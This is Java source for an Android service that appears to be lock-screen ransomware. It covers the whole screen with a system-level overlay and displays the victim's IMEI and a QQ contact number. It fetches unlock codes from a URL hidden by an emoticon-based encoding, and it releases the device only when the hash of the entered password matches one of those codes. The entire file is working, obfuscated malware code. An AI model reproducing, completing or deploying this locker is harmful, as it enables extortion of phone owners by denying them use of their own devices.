package peigen.banquan;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.os.*;
import android.telephony.*;
import android.view.*;
import android.view.View.*;
import android.view.WindowManager.*;
import android.webkit.*;
import android.widget.*;
import java.io.*;
import java.net.*;
public class peigen extends Service
{
	private WindowManager.LayoutParams wmParams;
	private WindowManager mWindowManager;
	private View mFloatLayout;
	private EditText 你妹的;
	private Button 你奶奶的;
	private TextView 求破解,tv;
	WebView wv;//声明控件
	private Handler handler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
				case ERROR:
					break;
				case SHOW_TEXT:
					try{
						String text = (String) msg.obj;
						String 第一层 = (String) text.subSequence(text.indexOf("【")+1, text.indexOf("】"));	
						String 第二层 = (String) text.subSequence(text.indexOf("〖")+1, text.indexOf("〗"));
						String 第三层 = (String) text.subSequence(text.indexOf("『")+1, text.indexOf("』"));
						String 第四层= (String) text.subSequence(text.indexOf("[")+1, text.indexOf("]"));	
						String 第五层= (String) text.subSequence(text.indexOf("{")+1, text.indexOf("}"));	
						String 培根=你妹的.getText().toString();
						String mm=MDX.GetMD5Code(培根);	
						String nn=SHX.牛逼(培根);
						String gdmm1=第一层;
						String gdmm2=第二层;
						String gdmm3=第三层;
						String gdmm4=第四层;
						String gdmm5=第五层;
						
						
						if (mm.equals(gdmm1))
						{
							求破解.setText(zifu.Jem("T^T(ฅ>ω<*ฅ)〒_〒=_=(๑• . •๑)(ಥ_ಥ)T^T(ฅ>ω<*ฅ)( •̀∀•́ )(๑• . •๑)( •̀∀•́ )=_=T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っT^T(๑•ั็ω•็ั๑)(๑• . •๑)(ฅ>ω<*ฅ)〒_〒←_←(ಥ_ಥ)⊙▽⊙T^T╭(°A°`)╮⊙▽⊙-.-⊙▽⊙-.-T^T(ฅ>ω<*ฅ)⊙▽⊙(ಥ_ಥ)〒_〒(๑• . •๑)T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っ"));

						}	
						else if (mm.equals(gdmm2))

						{
							求破解.setText(zifu.Jem("T^T(ฅ>ω<*ฅ)〒_〒=_=(๑• . •๑)(ಥ_ಥ)T^T(ฅ>ω<*ฅ)( •̀∀•́ )(๑• . •๑)( •̀∀•́ )=_=T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っT^T(๑•ั็ω•็ั๑)(๑• . •๑)(ฅ>ω<*ฅ)〒_〒←_←(ಥ_ಥ)⊙▽⊙T^T╭(°A°`)╮⊙▽⊙-.-⊙▽⊙-.-T^T( •̀∀•́ )〒_〒(ง •̀_•́)ง〒_〒←_←T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っ"));

						}
						else if (nn.equals(gdmm3))
						{					
							求破解.setText(zifu.Jem("T^T(ฅ>ω<*ฅ)〒_〒=_=(๑• . •๑)(ಥ_ಥ)T^T(ฅ>ω<*ฅ)( •̀∀•́ )(๑• . •๑)( •̀∀•́ )=_=T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っT^T(๑•ั็ω•็ั๑)(๑• . •๑)(ฅ>ω<*ฅ)〒_〒←_←(ಥ_ಥ)⊙▽⊙T^T╭(°A°`)╮⊙▽⊙-.-⊙▽⊙-.-T^T(ฅ>ω<*ฅ)( •̀∀•́ )-_-||( •̀∀•́ )→_→T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っ"));
						}
						else if (nn.equals(gdmm4))
						{	
							求破解.setText(zifu.Jem("T^T(ฅ>ω<*ฅ)〒_〒=_=(๑• . •๑)(ಥ_ಥ)T^T(ฅ>ω<*ฅ)( •̀∀•́ )(๑• . •๑)( •̀∀•́ )=_=T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っT^T(๑•ั็ω•็ั๑)(๑• . •๑)(ฅ>ω<*ฅ)〒_〒←_←(ಥ_ಥ)⊙▽⊙T^T╭(°A°`)╮⊙▽⊙-.-⊙▽⊙-.-T^T( •̀∀•́ )( •̀∀•́ )(･ิϖ･ิ)っ( •̀∀•́ )(๑•ั็ω•็ั๑)T^T(ฅ>ω<*ฅ)〒_〒→_→( •̀∀•́ )(･ิϖ･ิ)っ"));
						}
							else if (nn.equals(gdmm5))
							{	
								mWindowManager.removeView(mFloatLayout);
								stopSelf();
						}
					}catch(Exception e){
					}
					break;
			}
		};
	};
	
	protected static final int ERROR = 1;
	protected static final int SHOW_TEXT = 2;
	
	@Override
	public IBinder onBind(Intent p1)
	{	   
		return null;
	}
	@Override
	public void onCreate()
	{
		cnmb("2663496795");

		super.onCreate();
	}	
	public void cnmb(String qq)
	{	
		wmParams = new WindowManager.LayoutParams();
		mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
		wmParams.type = LayoutParams.TYPE_SYSTEM_ERROR;
		wmParams.format = PixelFormat.RGBA_8888;
		wmParams.gravity = Gravity.TOP | Gravity.TOP;
		wmParams.flags=1;
		wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
		wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
		LayoutInflater inflater = LayoutInflater.from(getApplication());
		mFloatLayout = inflater.inflate(R.layout.peigen, null);
		mWindowManager.addView(mFloatLayout, wmParams);
		
		你妹的=(EditText) mFloatLayout.findViewById(R.id.et);
		你奶奶的=(Button) mFloatLayout.findViewById(R.id.bt);
		求破解=(TextView) mFloatLayout.findViewById(R.id.tv1);
		TextView imei=(TextView) mFloatLayout.findViewById(R.id.imei);
		

		TextView tv = (TextView) mFloatLayout.findViewById(R.id.tv);

		boolean isVm = 中华人民共和国.isEmulator(this);

		tv.setText("欢迎大佬破解 输出值:"+isVm);
		
		
		
		wv = (WebView)mFloatLayout. findViewById(R.id.mainWebView1);
		wv.getSettings().setJavaScriptEnabled(true);
		wv.setWebViewClient(new WebViewClient() {
				public boolean shouldOverrideUrlLoading(WebView view, String url) {
					view.loadUrl(url);return true;}});
		wv.loadUrl("file:///android_asset/index.html");try{}
		catch (Exception e){}try{}catch (Exception e){}
		
	
		TelephonyManager tm = (TelephonyManager) 
			this.getSystemService(TELEPHONY_SERVICE); 
		String m=tm.getDeviceId();
		double e= Double.parseDouble(m);
		java.text.DecimalFormat   df   =new java.text.DecimalFormat("#");  
	  	String re= df.format(e);
		final String r="你的IMEI:"+re;

		imei.setText(r);
		
		你奶奶的.setOnClickListener(new OnClickListener(){

				@Override
				public void onClick(View p1)
				{
					// TODO: Implement this method
					url();
				}
				});
		
	}

	private WebView findViewById(int mainWebView1)
	{
		// TODO: Implement this method
		return null;
	}
	private void url() {

		new Thread() {
			public void run() {
				try {
					URL url = new URL(zifu.Jem("(๑•ั็ω•็ั๑)( •̀∀•́ )╭(°A°`)╮(ง •̀_•́)ง╭(°A°`)╮(ง •̀_•́)ง╭(°A°`)╮←_←╭(°A°`)╮(ಥ_ಥ)(ಥ_ಥ)⊙▽⊙(･ิϖ･ิ)っ-_-||(･ิϖ･ิ)っ-_-||╭(°A°`)╮(ಥ_ಥ)(๑•ั็ω•็ั๑)→_→(๑•ั็ω•็ั๑)T^T╭(°A°`)╮(ಥ_ಥ)╭(°A°`)╮(ฅ>ω<*ฅ)(๑•ั็ω•็ั๑)(๑• . •๑)(･ิϖ･ิ)っT^T╭(°A°`)╮╭(°A°`)╮(๑•ั็ω•็ั๑)-_-||(๑•ั็ω•็ั๑)(ง •̀_•́)ง(๑•ั็ω•็ั๑)(ฅ>ω<*ฅ)(๑•ั็ω•็ั๑)=_=(๑•ั็ω•็ั๑)-_-||(･ิϖ･ิ)っT^T(๑•ั็ω•็ั๑)(ಥ_ಥ)(๑•ั็ω•็ั๑)-_-||(๑•ั็ω•็ั๑)=_=(･ิϖ･ิ)っ-_-||(๑•ั็ω•็ั๑)(ฅ>ω<*ฅ)(๑•ั็ω•็ั๑)T^T╭(°A°`)╮(ง •̀_•́)ง╭(°A°`)╮(･ิϖ･ิ)っ╭(°A°`)╮(๑• . •๑)(･ิϖ･ิ)っ-_-||(ಥ_ಥ)(ง •̀_•́)ง(ಥ_ಥ)( •̀∀•́ )(ಥ_ಥ)(ง •̀_•́)ง(ಥ_ಥ)(๑•ั็ω•็ั๑)(ಥ_ಥ)( •̀∀•́ )(ಥ_ಥ)╭(°A°`)╮"));
					HttpURLConnection conn = (HttpURLConnection) url
						.openConnection();
					conn.setRequestMethod("GET");
					conn.setConnectTimeout(5000);
					conn.setRequestProperty(
						"User-Agent",
						"Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1; sv1; .NET4.0C; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Shuame");

					int code = conn.getResponseCode();
					if (code == 200) {
						InputStream is = conn.getInputStream();
						String result = niubi.readInputStream(is);
						Message msg = new Message();
						msg.what = SHOW_TEXT;
						msg.obj = result;
						handler.sendMessage(msg);

					} else {
						Message msg = new Message();
						msg.what = ERROR;
						handler.sendMessage(msg);
					}

				} catch (Exception e) {
					e.printStackTrace();
					Message msg = new Message();
					msg.what = ERROR;
					handler.sendMessage(msg);
				}
			};
		}.start();
	}
		}
